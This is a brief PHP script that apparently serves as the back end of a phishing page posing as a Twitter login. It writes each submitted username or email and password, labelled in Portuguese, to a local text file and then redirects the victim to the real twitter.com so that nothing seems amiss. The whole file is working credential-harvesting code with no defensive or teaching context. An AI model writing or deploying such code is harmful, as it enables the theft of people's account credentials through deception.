<?php

file_put_contents("usernames.txt", "Conta: " . $_POST['usernameOrEmail'] . " Senha: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://twitter.com/');
exit();
